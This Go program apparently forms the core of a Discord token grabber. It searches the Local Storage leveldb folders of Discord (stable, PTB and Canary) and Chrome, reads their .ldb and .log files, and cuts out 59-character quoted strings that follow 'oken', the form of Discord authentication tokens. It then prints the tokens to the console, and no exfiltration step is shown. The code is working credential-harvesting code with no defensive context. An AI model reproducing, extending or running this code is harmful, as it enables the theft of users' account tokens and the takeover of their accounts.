package main

import (
	"fmt"
	"os"
	"strings"
)

func main() {
	allpaths := getPaths()
	var tokens []string = getTokens(allpaths)
	fmt.Println(tokens)
}

func getTokens(paths []string) []string {
	var tokens []string
	for _, ele := range paths {
		files, _ := os.ReadDir(ele)
		for _, file := range files {
			if !strings.Contains(file.Name(), ".ldb") && !strings.Contains(file.Name(), ".log") {
				continue
			}
			openedFile, _ := os.ReadFile(fmt.Sprintf("%v/%v", ele, file.Name()))
			index := strings.Index(string(openedFile), "oken")
			if index > 1 && index+100 < len(openedFile) {
				s_string := string(openedFile[index : index+100])
				q_ind := strings.Index(string(s_string), `"`) + 1
				if q_ind+59 < 100 && s_string[q_ind : q_ind+60][len(s_string[q_ind:q_ind+60])-1:] == `"` {
					tokens = append(tokens, s_string[q_ind:q_ind+59])
				}
			}
		}
	}
	return tokens
}

func getPaths() []string {
	workName := [4]string{"discord/Local Storage/leveldb/", "discordptb/Local Storage/leveldb/", "discordcanary/Local Storage/leveldb/", "Google/Chrome/Default/Local Storage/leveldb/"}
	var workingPaths []string

	home, _ := os.UserHomeDir()
	cache, _ := os.UserCacheDir()
	appdata, _ := os.UserConfigDir()
	fmt.Printf("\nhome: %v", home)
	fmt.Printf("\ncache: %v", cache)
	fmt.Printf("\nappdata: %v\n", appdata)
	for _, ele := range workName {
		if _, err := os.Stat(fmt.Sprintf("%v/%v", appdata, ele)); !os.IsNotExist(err) {
			workingPaths = append(workingPaths, fmt.Sprintf("%v/%v", appdata, ele))
		}
	}
	return workingPaths
}
